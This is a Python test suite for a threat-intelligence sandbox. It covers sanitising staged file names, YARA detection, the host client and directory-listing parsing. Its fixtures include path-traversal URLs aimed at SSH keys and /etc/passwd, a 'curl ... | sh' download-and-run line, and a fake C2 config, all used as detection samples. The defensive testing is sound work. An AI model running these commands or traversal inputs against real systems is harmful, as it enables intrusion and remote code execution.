"""Tests for the open-directory sandbox path.

Three layers, tested where each one can actually be checked here:

* the analyzer (sandbox/analyze.py) runs directly - it is pure static
  analysis with no container dependency
* the staging-name sanitizer runs directly - it is the boundary that
  stops an adversary-controlled URL writing outside the staging directory
* the host client is tested against a stubbed transport, because the real
  one needs a probe VM and Docker

The container's isolation flags are verified by
probe_vm/setup_probe_vm.sh, which refuses to finish if --network=none
lets a container reach the network. That check belongs on the VM that
runs it, not in a suite that runs on a host with no Docker.
"""
from __future__ import annotations

import importlib.util
import json
from pathlib import Path

import pytest

from cti.errors import VMProxyError
from cti.probe import sandbox

REPO = Path(__file__).resolve().parents[1]


def _load(path: Path, name: str):
    spec = importlib.util.spec_from_file_location(name, path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


analyze_mod = _load(REPO / "sandbox" / "analyze.py", "sbx_analyze")


def _helper():
    """probe_helper.py is the VM-side payload: stdlib only, not importable
    as part of the package. Load it by path, with main() defused."""
    src = (REPO / "probe_vm" / "probe_helper.py").read_text()
    ns: dict = {}
    exec(compile(src.replace("raise SystemExit(main())", "pass"),
                 "probe_helper.py", "exec"), ns)
    return ns


helper = _helper()


# --------------------------------------------------------------------------- #
# Staging names - the traversal boundary
# --------------------------------------------------------------------------- #

@pytest.mark.parametrize("url", [
    "http://1.2.3.4/../../root/.ssh/authorized_keys",
    "http://1.2.3.4/..%2f..%2f..%2fetc%2fpasswd",
    "http://1.2.3.4/%00evil",
    "http://1.2.3.4/dir/sub/../../escape",
    "http://1.2.3.4/" + "A" * 400,
    "http://1.2.3.4/",
])
def test_staged_names_cannot_escape_the_staging_directory(url):
    """The filename is derived from an adversary-controlled URL. Traversal
    here would write outside the directory the container mounts."""
    name = helper["_safe_name"](url, 7)
    assert "/" not in name and "\\" not in name
    assert not name.startswith(".")
    assert "\x00" not in name
    assert len(name) < 100
    assert (Path("/staging") / name).resolve().parent == Path("/staging")


def test_staged_names_stay_distinct_for_same_named_files():
    a = helper["_safe_name"]("http://h/a/config.json", 0)
    b = helper["_safe_name"]("http://h/b/config.json", 1)
    assert a != b


# --------------------------------------------------------------------------- #
# Static analysis
# --------------------------------------------------------------------------- #

def _yara():
    try:
        import yara
    except ImportError:
        return None
    return yara.compile(filepaths={
        p.stem: str(p) for p in sorted((REPO / "sandbox" / "rules").glob("*.yar"))})


def test_yara_rules_compile():
    rules = _yara()
    if rules is None:
        pytest.skip("yara-python not installed on this host (it is in the image)")
    assert rules is not None


@pytest.mark.parametrize("name,content,rule", [
    ("beacon.pem", b"-----BEGIN RSA PRIVATE KEY-----\nMIIE\n", "private_key_material"),
    ("cmd5.txt", b"#!/bin/sh\ncurl -s http://1.2.3.4/x | sh\n", "shell_payload"),
    ("logs.txt", b"URL: https://b.example\nUsername: a\nPassword: b\n",
     "credential_dump_shape"),
    ("svc", b"\x7fELF\x02\x01\x01" + b"\x00" * 50, "elf_executable"),
])
def test_high_signal_files_are_flagged_notable(tmp_path, name, content, rule):
    rules = _yara()
    if rules is None:
        pytest.skip("yara-python not installed on this host")
    path = tmp_path / name
    path.write_bytes(content)
    result = analyze_mod.analyze(path, rules)
    assert rule in {h["rule"] for h in result["yara_hits"]}
    assert result["verdict"] == "notable"


def test_a_plain_readme_is_unremarkable(tmp_path):
    path = tmp_path / "readme.txt"
    path.write_bytes(b"Thanks for reading. Nothing to see.\n")
    assert analyze_mod.analyze(path, _yara())["verdict"] == "unremarkable"


def test_a_binary_wearing_a_text_extension_is_a_mismatch(tmp_path):
    """The cheapest lie a staged payload tells. The first version of the
    check only compared extensions it had an expected type for, so .txt -
    the interesting case - was never checked."""
    path = tmp_path / "notes.txt"
    path.write_bytes(b"MZ\x90\x00\x03" + b"\x00" * 80)
    result = analyze_mod.analyze(path, _yara())
    assert result["type_mismatch"] and result["verdict"] == "notable"


def test_a_binary_with_its_own_extension_is_not_a_mismatch(tmp_path):
    path = tmp_path / "loader.exe"
    path.write_bytes(b"MZ\x90\x00\x03" + b"\x00" * 80)
    assert not analyze_mod.analyze(path, _yara())["type_mismatch"]


def test_indicators_are_extracted_for_pivoting(tmp_path):
    path = tmp_path / "config.ini"
    path.write_bytes(b"c2=http://185.99.4.12:8443/gate\nfallback=evil.example\n")
    extracted = analyze_mod.analyze(path, _yara())["extracted"]
    assert "185.99.4.12" in extracted["ipv4"]
    assert any("185.99.4.12" in u for u in extracted["urls"])


def test_one_unreadable_file_does_not_lose_the_others(tmp_path, monkeypatch):
    (tmp_path / "good.txt").write_bytes(b"fine")
    (tmp_path / "bad.txt").write_bytes(b"also fine")

    real = analyze_mod.analyze

    def flaky(path, rules):
        if path.name == "bad.txt":
            raise OSError("simulated read failure")
        return real(path, rules)

    monkeypatch.setattr(analyze_mod, "analyze", flaky)
    monkeypatch.setattr("sys.argv", ["analyze", str(tmp_path)])
    import io
    import sys
    buf = io.StringIO()
    monkeypatch.setattr(sys, "stdout", buf)
    analyze_mod.main()
    payload = json.loads(buf.getvalue())
    assert payload["analyzed"] == 1 and len(payload["errors"]) == 1


def test_a_huge_file_is_hashed_in_full_but_parsed_bounded(tmp_path):
    """A decompression bomb or a 2 GB log must not be read into memory."""
    path = tmp_path / "big.bin"
    path.write_bytes(b"A" * (analyze_mod.MAX_READ + 1024))
    result = analyze_mod.analyze(path, None)
    assert result["size"] == analyze_mod.MAX_READ + 1024
    assert result["truncated_at"] == analyze_mod.MAX_READ
    assert len(result["sha256"]) == 64


# --------------------------------------------------------------------------- #
# Host client - no bytes may reach this side
# --------------------------------------------------------------------------- #

def test_host_client_records_verdicts_and_never_receives_bytes(monkeypatch):
    captured = {}

    def fake_fetch(urls, *, max_files, max_total_bytes):
        captured["urls"] = urls
        return {"results": [{"path": "beacon.pem", "url": urls[0],
                             "sha256": "a" * 64, "size": 1200,
                             "magic": "ASCII text", "mime": "text/plain",
                             "yara_hits": [{"rule": "private_key_material"}],
                             "strings_sample": ["-----BEGIN RSA"],
                             "extracted": {"urls": [], "ipv4": []},
                             "verdict": "notable"}],
                "errors": [], "fetched": 1, "analyzed": 1, "error": None}

    monkeypatch.setattr(sandbox.vm_proxy, "fetch_and_analyze", fake_fetch)
    out = sandbox.analyze_urls(["http://1.2.3.4:4443/beacon.pem"],
                               indicator="1.2.3.4", actor="sliver-c2")
    assert out["analyzed"] == 1
    assert [r["path"] for r in out["notable"]] == ["beacon.pem"]
    # Nothing in the response carries file content.
    blob = json.dumps(out)
    assert "content" not in blob and "bytes" not in blob


def test_host_client_reports_an_unreachable_probe_vm_without_raising(monkeypatch):
    def boom(urls, **kw):
        raise VMProxyError("ssh transport failed")

    monkeypatch.setattr(sandbox.vm_proxy, "fetch_and_analyze", boom)
    out = sandbox.analyze_urls(["http://1.2.3.4/x"], indicator="1.2.3.4")
    assert "probe VM unreachable" in out["error"] and out["results"] == []


def test_host_client_refuses_an_empty_request(monkeypatch):
    """There is deliberately no 'analyze the whole directory' shortcut -
    downloading staged payloads is a decision per file."""
    out = sandbox.analyze_urls([], indicator="1.2.3.4")
    assert out["error"] and out["results"] == []


def test_host_client_caps_the_number_of_files(monkeypatch):
    captured = {}

    def fake_fetch(urls, *, max_files, max_total_bytes):
        captured["n"] = len(urls)
        return {"results": [], "errors": [], "fetched": 0, "analyzed": 0, "error": None}

    monkeypatch.setattr(sandbox.vm_proxy, "fetch_and_analyze", fake_fetch)
    sandbox.analyze_urls([f"http://1.2.3.4/{i}" for i in range(500)],
                         indicator="1.2.3.4")
    assert captured["n"] == sandbox.MAX_FILES


# --------------------------------------------------------------------------- #
# Autoindex parsing
# --------------------------------------------------------------------------- #

def test_apache_listings_carry_size_and_mtime():
    body = ('<html><head><title>Index of /f</title></head><body><pre>'
            '<a href="../">Parent Directory</a>\n'
            '<a href="payload.bin">payload.bin</a>  2026-09-12 14:03   1.4M\n'
            '</pre></body></html>')
    files = helper["parse_autoindex"](body, "http://1.2.3.4/f/")
    assert files[0]["size"] == "1.4M" and files[0]["mtime"] == "2026-09-12 14:03"


def test_python_http_server_listings_genuinely_have_no_size_or_mtime():
    """All 37 opendir_files rows in the live data have NULL size and mtime,
    which looks like a parsing bug and is not: the one host scanned so far
    runs Python's http.server, whose listing carries neither. Pinning this
    so the next person does not go looking for the bug either."""
    body = ('<html><head><title>Directory listing for /</title></head><body>'
            '<ul><li><a href="cmd1.txt">cmd1.txt</a></li>'
            '<li><a href="sub/">sub/</a></li></ul></body></html>')
    files = helper["parse_autoindex"](body, "http://1.2.3.4/")
    assert [f["name"] for f in files] == ["cmd1.txt", "sub"]
    assert all(f["size"] is None and f["mtime"] is None for f in files)
    assert files[1]["is_dir"] is True


def test_a_page_that_is_not_a_listing_returns_none():
    assert helper["parse_autoindex"]("<html><body>hello</body></html>",
                                     "http://1.2.3.4/") is None


# --------------------------------------------------------------------------- #
# The observe action - it must degrade, not fail, on an un-provisioned VM
# --------------------------------------------------------------------------- #

def test_observe_on_a_vm_without_the_tools_reports_instead_of_crashing():
    """The probe VM cannot be re-provisioned from here, so the action has to
    be safe to call before setup_probe_vm.sh has ever installed httpx."""
    result = helper["action_observe"]({"target": "example.com", "kind": "domain"})
    assert result["error"] and "setup_probe_vm.sh" in result["error"]
    assert "httpx" in result["tools_missing"]
    assert result["http"] == {} and result["tls"] == {}


def test_observe_rejects_an_empty_target():
    assert helper["action_observe"]({"target": "  "})["error"] == "no target given"


def test_observe_infers_the_kind_from_the_target():
    ip = helper["action_observe"]({"target": "193.29.58.192"})
    domain = helper["action_observe"]({"target": "example.com"})
    assert ip["kind"] == "ip" and domain["kind"] == "domain"


def test_observe_does_not_scan_ports_unless_asked():
    """A port scan is active traffic; everything else in the pass is the same
    light-touch contact the ordinary sweep already makes."""
    result = helper["action_observe"]({"target": "example.com"})
    assert result["ports"] == []
    assert "ports" not in result["errors"], "naabu must not even be attempted"


def test_observe_skips_registration_lookups_for_an_ip():
    result = helper["action_observe"]({"target": "193.29.58.192", "kind": "ip"})
    assert "dns" not in result["errors"] and "whois" not in result["errors"]


def test_check_access_reports_every_observe_tool():
    """A half-provisioned VM that silently collects less is worse than one
    that says what is missing."""
    tools = helper["check_access"]()["tools"]
    for tool in ("httpx", "tlsx", "dnsx", "whois", "naabu", "cdncheck"):
        assert tool in tools, f"{tool} not reported by --check-access"


def test_the_bootstrap_installs_what_observe_needs():
    bootstrap = (REPO / "probe_vm" / "setup_probe_vm.sh").read_text()
    for tool in ("httpx", "tlsx", "dnsx", "naabu", "cdncheck", "whois"):
        assert tool in bootstrap, f"setup_probe_vm.sh never installs {tool}"
